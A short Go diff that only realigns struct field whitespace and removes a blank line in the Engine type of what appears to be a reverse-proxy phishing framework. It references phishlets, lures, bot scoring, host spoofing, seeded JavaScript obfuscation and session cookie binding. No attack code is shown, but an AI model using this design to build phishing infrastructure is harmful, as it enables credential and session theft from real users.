@@ -23,25 +23,25 @@ import (
 )
 
 type Engine struct {
-	store    core.PhishletStore
-	sessions core.SessionStore
-	bus      core.EventBus // optional, nil ok
-	scorer   core.BotScorer
-	blocked  core.Blocklist
-	lures    core.LureStore
-	spoof    func(host string) string
+	store     core.PhishletStore
+	sessions  core.SessionStore
+	bus       core.EventBus // optional, nil ok
+	scorer    core.BotScorer
+	blocked   core.Blocklist
+	lures     core.LureStore
+	spoof     func(host string) string
 	challenge func() string
 	sidName   string
 	chPrefix  string
-	js       func(src string, seed int64) string
-	limit    Limiter
-	capMu    sync.Mutex
-	capped   map[string]time.Time
-	capTTL   time.Duration
-	upstream map[string]string // origHost -> baseURL override (e2e/lab)
+	js        func(src string, seed int64) string
+	limit     Limiter
+	capMu     sync.Mutex
+	capped    map[string]time.Time
+	capTTL    time.Duration
+	upstream  map[string]string // origHost -> baseURL override (e2e/lab)
 	transport http.RoundTripper
-	fp       http.Handler
-	track    http.Handler
+	fp        http.Handler
+	track     http.Handler
 }
 
 // Limiter — rate-limit интерфейс (реализация internal/ratelimit).
@@ -222,7 +222,6 @@ func (e *Engine) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 	}
-
 
 	// Сессия через cookie + валидация (anti-fixation) + привязка IP/JA4.
 	sid := cookie(r, e.sidName)
